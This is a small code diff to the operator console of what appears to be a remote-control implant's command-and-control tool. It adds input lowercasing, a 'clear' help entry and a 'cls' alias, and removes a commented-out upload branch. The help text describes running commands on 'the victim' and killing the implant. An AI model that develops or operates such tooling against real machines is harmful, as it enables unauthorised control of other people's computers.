@@ -212,13 +212,14 @@ def input_thread():
         new_cmd = ""
 
         if global_connection:
-            new_cmd = input("$ ")
+            new_cmd = input("$ ").lower()
         #help
         if new_cmd == "help":
             print("""Run a command on the victim or
     - use \"getpid\" to get the process ID of the implant.
     - use \"kill\" to kill the implant.
     - use \"history\" to view command history.
+    - use \"clear\" to clear the screen
     - use \"help\" to view this help message.
     - use \"exit\" to exit.
             """)
@@ -235,8 +236,6 @@ def input_thread():
                 print("Queue:")
                 for cmd in CMD_QUEUE:
                     print("  " + cmd)
-        #elif new_cmd.split(' ')[0] == "upload":
-            #encodeFile(new_cmd.split(' ')[1])
         #exit
         elif new_cmd == "exit":
             print("Exitting...")
@@ -246,7 +245,7 @@ def input_thread():
         #banner
         elif new_cmd == "banner":
             printHeader()
-        elif new_cmd == "clear":
+        elif new_cmd == "clear" or new_cmd == "cls":
             clearScreen()
         #execute command on victim
         elif new_cmd.strip() != "":
